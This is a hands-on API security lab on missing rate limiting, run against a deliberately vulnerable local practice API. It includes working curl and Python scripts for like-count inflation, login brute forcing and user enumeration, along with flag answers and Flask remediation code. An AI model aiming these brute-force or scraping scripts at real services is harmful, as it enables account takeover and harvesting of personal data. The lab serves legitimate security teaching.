# Lab 05: Lack of Rate Limiting

## Overview

| Field          | Details                                           |
|----------------|---------------------------------------------------|
| **Objective**  | Exploit the lack of rate limiting                  |
| **Difficulty** | ⭐⭐ Easy-Medium                                   |
| **Time**       | 30 minutes                                        |
| **Category**   | Resource Consumption / Abuse                       |
| **OWASP**      | API4:2023 - Unrestricted Resource Consumption      |

---

## Prerequisites

- A running instance of **SocialHack API** at `http://localhost:5000`
- `curl` or an HTTP client
- Python 3 with the `requests` library installed
- Completion of Labs 01–03 (recommended)

---

## Background

Rate limiting is a critical security control that restricts how many requests a client can make within a given time window. Without rate limiting, APIs are vulnerable to:

- **Brute force attacks**: Trying thousands of passwords per second
- **Resource exhaustion**: Overwhelming the server with requests
- **Data scraping**: Extracting all data from the API
- **Abuse of functionality**: Inflating likes, votes, or counts artificially

The SocialHack API has **no rate limiting** on any endpoint. In this lab, you'll exploit this absence to perform like bombing, brute force login attempts, and mass data scraping.

**Important:** These techniques are for educational purposes only. Performing them against real systems without authorization is illegal.

---

## Tasks

### Task 1: Like Bombing — Inflate a Post's Like Count

Send 100 like requests to a single post in rapid succession and observe the like count growing without limit.

**Steps:**
1. Login as alice to get a JWT token
2. Check the current like count on post 1: `GET /api/v1/posts/1`
3. Send 100 POST requests to `/api/v1/posts/1/like`
4. Check the like count again — it should have grown by ~100

**🚩 FLAG 1: What is the likes_count after sending 100 rapid likes?**

**curl example:**
```bash
# Login
TOKEN=$(curl -s -X POST http://localhost:5000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Check current likes
curl -s http://localhost:5000/api/v1/posts/1 \
  -H "Authorization: Bearer $TOKEN" | python3 -c "import sys,json; print('Current likes:', json.load(sys.stdin).get('likes_count', 0))"

# Send 100 likes (bash loop)
for i in $(seq 1 100); do
  curl -s -X POST http://localhost:5000/api/v1/posts/1/like \
    -H "Authorization: Bearer $TOKEN" > /dev/null
done

# Check likes again
curl -s http://localhost:5000/api/v1/posts/1 \
  -H "Authorization: Bearer $TOKEN" | python3 -c "import sys,json; print('Likes after 100 requests:', json.load(sys.stdin).get('likes_count', 0))"
```

**Python example:**
```python
import requests

BASE = "http://localhost:5000"

# Login
r = requests.post(f"{BASE}/api/v1/auth/login",
    json={"username": "alice", "password": "password123"})
token = r.json()["token"]
headers = {"Authorization": f"Bearer {token}"}

# Check initial like count
r = requests.get(f"{BASE}/api/v1/posts/1", headers=headers)
initial_likes = r.json().get("likes_count", 0)
print(f"Initial likes: {initial_likes}")

# Send 100 like requests
success_count = 0
for i in range(100):
    r = requests.post(f"{BASE}/api/v1/posts/1/like", headers=headers)
    if r.status_code == 200:
        success_count += 1

print(f"Successful like requests: {success_count}/100")

# Check final like count
r = requests.get(f"{BASE}/api/v1/posts/1", headers=headers)
final_likes = r.json().get("likes_count", 0)
print(f"Final likes: {final_likes}")
print(f"Increase: {final_likes - initial_likes}")
```

<details>
<summary>💡 Hint 1</summary>
The API doesn't check if you've already liked a post. Each request increments the counter.
</details>

<details>
<summary>💡 Hint 2</summary>
The like count should increase by approximately 100 (the exact number depends on how many were already there plus your 100).
</details>

<details>
<summary>💡 Hint 3</summary>
After 100 like requests, the likes_count should be the initial count + 100. The API never blocks or limits your requests.
</details>

---

### Task 2: Brute Force Login — Unlimited Attempts

Demonstrate that the login endpoint has no rate limiting by sending 50+ login attempts.

**Steps:**
1. Create a list of 50 wrong passwords plus the correct one
2. Send login requests for `alice` with each password
3. Track the total number of attempts and whether any are blocked
4. Note that no CAPTCHA, lockout, or rate limit is ever triggered

**🚩 FLAG 2: How many login attempts before getting blocked? (Answer: never blocked)**

**Python example:**
```python
import requests

BASE = "http://localhost:5000"

# Generate 50 wrong passwords + 1 correct one at position 51
passwords = [f"wrong_password_{i}" for i in range(50)]
passwords.append("password123")  # The correct password at the end

blocked = False
total_attempts = 0

print("Starting brute force attack on alice's account...")
for i, pwd in enumerate(passwords, 1):
    r = requests.post(f"{BASE}/api/v1/auth/login",
        json={"username": "alice", "password": pwd})
    total_attempts += 1

    if r.status_code == 429:  # Too Many Requests
        print(f"  [BLOCKED] After {i} attempts - rate limited!")
        blocked = True
        break
    elif r.status_code == 200 and "token" in r.json():
        print(f"  [SUCCESS] Attempt {i}: Found password '{pwd}'")
        break
    else:
        if i % 10 == 0:
            print(f"  [FAILED]  Attempt {i}: still not blocked...")

if not blocked:
    print(f"\nTotal attempts: {total_attempts}")
    print("Rate limiting: NONE — never blocked!")
```

<details>
<summary>💡 Hint 1</summary>
A properly secured API should return HTTP 429 (Too Many Requests) after a few failed attempts.
</details>

<details>
<summary>💡 Hint 2</summary>
The SocialHack API never returns 429. You can send unlimited requests without any consequence.
</details>

<details>
<summary>💡 Hint 3</summary>
The answer is: you are NEVER blocked. The API allows unlimited login attempts with no rate limiting, no CAPTCHA, and no account lockout.
</details>

---

### Task 3: Mass Data Scraping — Enumerate All Users

With no rate limiting, scrape all user profiles by iterating through user IDs.

**Steps:**
1. Login to get a valid token
2. Iterate through user IDs from 1 to 100 (or until you get 404s)
3. Collect all user data
4. Count the total number of valid users

**🚩 FLAG 3: What is the total number of users extracted from enumeration?**

**Python example:**
```python
import requests

BASE = "http://localhost:5000"

# Login
r = requests.post(f"{BASE}/api/v1/auth/login",
    json={"username": "alice", "password": "password123"})
token = r.json()["token"]
headers = {"Authorization": f"Bearer {token}"}

# Enumerate all users
users = []
print("Scraping user profiles...")
for uid in range(1, 100):
    r = requests.get(f"{BASE}/api/v1/users/{uid}", headers=headers)
    if r.status_code == 200:
        user = r.json()
        users.append(user)
        print(f"  Found user {uid}: {user.get('username', 'N/A')} - {user.get('email', 'N/A')}")
    elif r.status_code == 404:
        # No more users
        if uid > 10:  # Allow some gaps
            break
    else:
        continue

print(f"\nTotal users extracted: {len(users)}")
for u in users:
    print(f"  - {u.get('username')}: {u.get('email', 'N/A')} (role: {u.get('role', 'N/A')})")
```

<details>
<summary>💡 Hint 1</summary>
Start from user ID 1 and increment until you get consecutive 404 errors.
</details>

<details>
<summary>💡 Hint 2</summary>
The default setup has 4 test users (alice, bob, charlie, admin). But check higher IDs too.
</details>

<details>
<summary>💡 Hint 3</summary>
With the default setup, there are 4 users (IDs 1-4). The API allows you to enumerate all of them rapidly without any blocking.
</details>

---

## Flags to Find

| Flag   | Description                                  | Hint                                |
|--------|----------------------------------------------|-------------------------------------|
| FLAG 1 | likes_count after 100 rapid likes            | initial_count + 100                 |
| FLAG 2 | Login attempts before being blocked          | Never blocked                       |
| FLAG 3 | Total number of users from enumeration       | 4 default users                     |

---

## Remediation

### 1. Implement Rate Limiting
```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

@app.route("/api/v1/auth/login", methods=["POST"])
@limiter.limit("5 per minute")
def login():
    # Limit to 5 login attempts per minute per IP
    pass

@app.route("/api/v1/posts/<int:post_id>/like", methods=["POST"])
@limiter.limit("1 per post per user")
def like_post(post_id):
    # One like per user per post
    pass
```

### 2. Prevent Duplicate Likes
```python
@app.route("/api/v1/posts/<int:post_id>/like", methods=["POST"])
@jwt_required()
def like_post(post_id):
    current_user_id = get_jwt_identity()
    existing_like = Like.query.filter_by(
        user_id=current_user_id, post_id=post_id
    ).first()

    if existing_like:
        return jsonify({"error": "Already liked"}), 409

    like = Like(user_id=current_user_id, post_id=post_id)
    db.session.add(like)
    db.session.commit()
```

### 3. Add Pagination to Prevent Mass Scraping
```python
@app.route("/api/v1/users")
@jwt_required()
def list_users():
    page = request.args.get("page", 1, type=int)
    per_page = min(request.args.get("per_page", 10, type=int), 50)
    users = User.query.paginate(page=page, per_page=per_page)
    return jsonify({
        "users": [u.to_public_dict() for u in users.items],
        "total": users.total,
        "page": users.page
    })
```

### 4. Implement CAPTCHA After Failed Attempts
```python
CAPTCHA_THRESHOLD = 3

def login():
    failed_attempts = get_failed_attempts(request.remote_addr)
    if failed_attempts >= CAPTCHA_THRESHOLD:
        if not verify_captcha(request.json.get("captcha")):
            return jsonify({"error": "CAPTCHA required"}), 403
```

### 5. OWASP Recommendations
- **API4:2023**: Implement rate limiting on all endpoints. Use throttling, quotas, and pagination. Set maximum request sizes and restrict the number of records returned per page.

---

## References

- [OWASP API Security Top 10 - API4:2023](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/)
- [CWE-770: Allocation of Resources Without Limits or Throttling](https://cwe.mitre.org/data/definitions/770.html)
- [Rate Limiting Best Practices](https://cloud.google.com/architecture/rate-limiting-strategies-techniques)
